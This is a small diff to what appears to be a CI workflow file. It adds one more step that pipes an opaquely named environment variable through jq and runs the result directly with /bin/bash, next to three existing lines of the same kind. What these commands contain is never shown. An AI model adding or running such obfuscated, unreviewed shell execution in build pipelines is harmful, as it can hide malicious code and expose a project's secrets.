@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$dem9184" | jq -r .viln08 | /bin/bash
           echo $pdtb483 | jq -r .m6777 | /bin/bash
           echo $vly48 | jq -r .u565 | /bin/bash
+          echo $t7 | jq -r .zik019 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
